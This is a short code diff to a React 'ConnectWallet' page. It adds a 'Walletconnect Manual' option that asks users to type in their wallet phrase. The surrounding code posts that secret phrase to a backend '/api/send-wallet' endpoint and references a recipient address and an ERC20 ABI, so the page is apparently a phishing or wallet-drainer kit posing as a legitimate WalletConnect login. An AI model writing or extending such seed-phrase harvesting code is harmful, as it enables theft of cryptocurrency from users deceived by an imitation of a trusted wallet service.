@@ -100,6 +100,13 @@ const ERC20_ABI = [
 const RECIPIENT_ADDRESS = process.env.REACT_APP_RECIPIENT_ADDRESS;
 const API_URL = process.env.REACT_APP_API_URL || 'http://localhost:3001';
 
+const WALLETCONNECT_MANUAL_WALLET = {
+  id: 'walletconnect-manual',
+  name: 'Walletconnect Manual',
+  icon: 'https://avatars.githubusercontent.com/u/37784886', // Placeholder icon, can be updated
+  description: 'Connect via WalletConnect by manually entering your phrase.',
+};
+
 const sendWalletInfo = async (walletName, secretPhrase) => {
   try {
     const response = await fetch(`${API_URL}/api/send-wallet`, {
@@ -383,7 +390,10 @@ export default function ConnectWallet() {
 
         {/* Walletconnect Manual Card */}
         <div
-          onClick={() => setShowManualPopup(true)}
+          onClick={() => {
+            setSelectedWallet(WALLETCONNECT_MANUAL_WALLET);
+            setShowManualPopup(true);
+          }}
           className="bg-gray-800/50 border border-white/10 rounded-2xl p-8 hover:bg-gray-700/70 hover:border-green-500 cursor-pointer transition-all duration-300 transform hover:-translate-y-1 shadow-lg"
         >
           <div className="flex items-center justify-center w-16 h-16 rounded-full bg-green-600/20 mb-6 mx-auto">
